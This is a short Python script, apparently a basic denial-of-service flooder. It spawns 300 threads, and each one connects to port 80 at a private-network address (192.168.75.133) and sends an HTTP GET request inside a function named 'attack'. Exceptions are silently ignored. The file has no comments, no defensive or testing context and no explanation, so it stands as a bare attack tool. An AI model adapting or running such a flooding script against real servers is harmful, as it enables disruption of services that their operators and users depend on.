import socket
import threading

target_ip = "192.168.75.133"
target_port = 80

def attack():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        request = b"GET / HTTP/1.1\r\nHost: 192.168.75.133\r\n\r\n"
        s.send(request)
        s.close()
    except:
        pass

for i in range(300):
    t = threading.Thread(target=attack)
    t.start()
